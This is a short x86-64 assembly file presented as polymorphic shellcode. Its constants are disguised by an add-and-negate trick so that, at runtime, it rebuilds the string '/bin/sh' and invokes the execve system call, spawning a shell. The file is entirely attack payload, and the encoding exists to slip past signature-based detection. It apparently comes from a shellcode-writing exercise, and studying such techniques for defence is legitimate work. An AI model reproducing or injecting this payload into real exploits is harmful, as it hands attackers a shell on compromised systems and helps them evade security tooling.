;Polymorphic code
;Shellcode Size 32

global _start

section .text

_start:

        xor eax, eax
        mov rbx, 0xFF978CD091969DD9 ; add value 8
        sub rbx, 8                  ; sub added value
        neg rbx
        push rbx

        push rsp
        pop rdi

        push rdx
        push rdi

        push rsp
        pop rsi
        mov al, 0x2b                    ; Sub 10 fromm 3b / 59
        add al, 0x10                    ; Add 10 to normalize the value 0x3b
        syscall
